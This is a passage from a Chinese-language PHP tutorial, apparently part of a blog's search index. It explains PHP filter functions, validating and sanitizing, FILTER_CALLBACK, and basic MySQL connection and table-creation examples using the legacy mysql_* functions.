代码块可以捕获不同种类的异常。</li><li>可以在 try 代码块内的 catch 代码块中再次抛出（re-thrown）异常。</li></ul><p><font color=orangered>简而言之：如果抛出了异常，就必须捕获它。</font></p><h3 id="PHP-过滤器（Filter）"><a href="#PHP-过滤器（Filter）" class="headerlink" title="PHP 过滤器（Filter）"></a>PHP 过滤器（Filter）</h3><p>PHP 过滤器用于验证和过滤来自非安全来源的数据，比如：</p><ul><li>来自表单的输入数据</li><li>Cookies</li><li>服务器变量</li><li>数据库查询结果</li></ul><h4 id="函数和过滤器"><a href="#函数和过滤器" class="headerlink" title="函数和过滤器"></a>函数和过滤器</h4><p>如需过滤变量，请使用下面的过滤器函数之一：</p><ul><li><code>filter_var()</code> - 通过一个指定的过滤器来过滤单一的变量</li><li><code>filter_var_array()</code> - 通过相同的或不同的过滤器来过滤多个变量</li><li><code>filter_input</code> - 获取一个输入变量，并对它进行过滤</li><li><code>filter_input_array</code> - 获取多个输入变量，并通过相同的或不同的过滤器对它们进行过滤</li></ul><h4 id="Validating-和-Sanitizing"><a href="#Validating-和-Sanitizing" class="headerlink" title="Validating 和 Sanitizing"></a>Validating 和 Sanitizing</h4><p>Validating 过滤器：</p><ul><li>用于验证用户输入</li><li>严格的格式规则（比如 URL 或 E-Mail 验证）</li><li>如果成功则返回预期的类型，如果失败则返回 FALSE</li></ul><p>Sanitizing 过滤器：</p><ul><li>用于允许或禁止字符串中指定的字符</li><li>无数据格式规则</li><li>始终返回字符串</li></ul><h4 id="Filter-Callback"><a href="#Filter-Callback" class="headerlink" title="Filter Callback"></a>Filter Callback</h4><p>通过使用 <code>FILTER_CALLBACK</code> 过滤器，可以调用自定义的函数，把它作为一个过滤器来使用。这样，我们就拥有了数据过滤的完全控制权。</p><p>在下面的例子中，我们使用了一个自定义的函数把所有 <code>&quot;_&quot;</code> 转换为空格：</p><ol><li>创建一个把 <code>&quot;_&quot;</code> 替换为空格的函数</li><li>调用 <code>filter_var()</code> 函数，它的参数是 <code>FILTER_CALLBACK</code> 过滤器以及包含我们的函数的数组</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convertSpace</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str_replace(<span class="string">"_"</span>, <span class="string">" "</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$string = <span class="string">"Peter_is_a_great_guy!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> filter_var($string, FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">"options"</span>=&gt;<span class="string">"convertSpace"</span>));</span><br></pre></td></tr></table></figure><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(servername,username,password);</span><br></pre></td></tr></table></figure><ul><li>servername：可选。规定要连接的服务器。默认是 “localhost:3306”。</li><li>username：可选。规定登录所使用的用户名。默认值是拥有服务器进程的用户的名称。</li><li>password：可选。规定登录所用的密码。默认是 “”。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$con = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"peter"</span>,<span class="string">"abc123"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// some code</span></span><br><span class="line"></span><br><span class="line">mysql_close($con);</span><br></pre></td></tr></table></figure><h3 id="数据库执行语句"><a href="#数据库执行语句" class="headerlink" title="数据库执行语句"></a>数据库执行语句</h3><p><code>mysql_query()</code> 函数，此函数用于向 MySQL 连接发送查询或命令。</p><p>创建表格实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$con = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"peter"</span>,<span class="string">"abc123"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create database</span></span><br><span class="line"><span class="keyword">if</span> (mysql_query(<span class="string">"CREATE DATABASE my_db"</span>,$con))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Database created"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Error creating database: "</span> . mysql_error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create table in my_db database</span></span><br><span class="line">mysql_select_db(<span class="string">"my_db"</span>, $con);</span><br><span class="line">$sql = <span class="string">"CREATE TABLE Persons</span></span><br><span class="line"><span class="string">(</span></span><br><span class="line"><span class="string">  FirstName varchar(15),</span></span><br><span class="line"><span class="string">  LastName varchar(15),</span></span><br><span class="line"><span class="string">  Age int</span></span><br><span class="line"><span class="string">)"</span>;</span><br><span class="line">mysql_query($sql,$con);</span><br><span class="line"></span><br><span class="line">mysql_close($con);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Web基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
